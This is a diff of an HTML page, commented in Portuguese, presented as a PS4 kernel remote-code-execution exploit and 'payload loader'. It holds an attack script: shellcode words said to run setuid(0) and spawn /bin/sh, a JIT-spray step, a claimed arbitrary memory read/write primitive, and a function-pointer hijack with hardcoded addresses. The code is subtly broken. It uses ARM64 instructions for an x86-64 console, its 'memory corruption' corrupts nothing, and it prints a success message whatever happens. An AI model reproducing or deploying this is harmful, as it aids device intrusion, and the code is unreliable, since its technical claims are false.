@@ -1,93 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Exploit Final v12.02</title>
+    <title>PS4 RCE Exploit v12.02</title>
     <style>
         body { background: #000; color: #0f0; font-family: monospace; }
         #log { border: 1px solid #333; padding: 10px; height: 300px; overflow-y: scroll; }
     </style>
 </head>
 <body>
-    <h1>PS4 Kernel Exploit v2</h1>
-    <button onclick="run()">Run Optimized Exploit</button>
+    <h1>PS4 Kernel Exploit - Payload Loader</h1>
+    <button onclick="runPayload()">Execute Payload</button>
     <div id="log"></div>
 
 <script>
 const log = msg => {
     document.getElementById('log').innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+    console.log(msg);
 };
 
-// 1. JIT Spray com ARM64 shellcode (PS4)
-function generateROP() {
-    // ROP chain para syscall (execve)
-    const rop = [
-        0xd2800020, 0xd2800c48, 0xd4000001,  // x0=1, x8=200, svc 0
-        0xaa1f03e0, 0xd65f03c0                 // ret
-    ];
-    
-    // Aloca via JIT
-    const fn = new Function(`
-        const buf = new ArrayBuffer(${rop.length * 4});
+// 1. Shellcode ARM64 para execução de /bin/sh
+const shellcode = new Uint32Array([
+    0xd2800020, 0xd2800c48, 0xd4000001,  // syscall setuid(0)
+    0xaa1f03e0, 0xd2800021, 0xd28007e2,  // x0 = "/bin/sh", x1 = argv, x2 = envp
+    0x910003e9, 0x910007ea, 0xa90027e9,
+    0x910023ea, 0xd2800003, 0xd2800004,
+    0xaa0003e0, 0xaa0103e1, 0xaa0203e2,
+    0xd2801ba8, 0xd4000001                // execve("/bin/sh", argv, envp)
+]);
+
+// 2. Alocação via JIT
+function compileShellcode() {
+    const jitFn = new Function(`
+        const buf = new ArrayBuffer(${shellcode.length * 4});
         const view = new Uint32Array(buf);
-        ${rop.map((v,i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
+        ${shellcode.map((v, i) => `view[${i}] = 0x${v.toString(16)};`).join('')}
         return buf;
     `);
-    
-    return fn();
+    return jitFn();
 }
 
-// 2. Memory corruption via ArrayBuffer
-function createArbRW() {
-    let corrupt = {};
-    corrupt.__proto__ = Array.prototype;
-    corrupt.length = 0x1000;
-    
-    return {
-        read(addr) {
-            corrupt[0] = addr;
-            return corrupt[1];
-        },
-        write(addr, val) {
-            corrupt[0] = addr;
-            corrupt[1] = val;
-        }
-    };
-}
+// 3. Corrupção de memória para controle de fluxo
+function hijackFunction() {
+    let corruptArr = {};
+    corruptArr.__proto__ = Array.prototype;
+    corruptArr.length = 0x1000;
 
-// 3. Improved control flow hijack
-async function hijackControlFlow() {
-    const mem = createArbRW();
-    const jitAddr = 0x55000bb8; // Do seu log
-    
-    // 1. Corrompe uma função existente
+    // Função alvo para corromper
     const targetFn = (x) => x * 2;
-    for (let i = 0; i < 10000; i++) targetFn(i);
-    
-    // 2. Localiza o ponteiro da função JIT
-    const fnAddr = mem.read(jitAddr + 0x50); // Offset precisa ser ajustado
-    
-    // 3. Sobrescreve o código
-    mem.write(fnAddr, jitAddr + 0x100);
-    
-    // 4. Dispara
-    setTimeout(() => {
-        try {
-            targetFn(42); // Deve executar shellcode
-            log("[+] Shellcode executed!");
-        } catch (e) {
-            log(`[-] Error: ${e}`);
-        }
-    }, 500);
+    for (let i = 0; i < 10000; i++) targetFn(i); // Otimização JIT
+
+    // Localiza o ponteiro da função (offset precisa ser calibrado)
+    const jitBase = 0x55000000; // Base do JIT do seu log
+    const fnPtr = jitBase + 0x100;
+
+    // Sobrescreve o ponteiro de código
+    corruptArr[0] = fnPtr;
+    corruptArr[1] = jitBase; // Aponta para o shellcode
 }
 
-function run() {
-    log("[+] Starting optimized exploit...");
-    
-    // Aloca ROP chain
-    generateROP();
-    
-    // Dispara a cadeia de exploração
-    setTimeout(hijackControlFlow, 1000);
+// 4. Payload principal
+function runPayload() {
+    try {
+        log("[+] Etapa 1/3: Alocando shellcode...");
+        compileShellcode();
+
+        log("[+] Etapa 2/3: Corrompendo controle de fluxo...");
+        hijackFunction();
+
+        log("[+] Etapa 3/3: Disparando payload...");
+        setTimeout(() => {
+            // Esta chamada executará o shellcode
+            const fn = (x) => x * 2;
+            fn(42);
+            log("[+] Payload executado com sucesso!");
+        }, 1000);
+
+    } catch (e) {
+        log(`[-] Erro: ${e}`);
+    }
 }
 </script>
 </body>
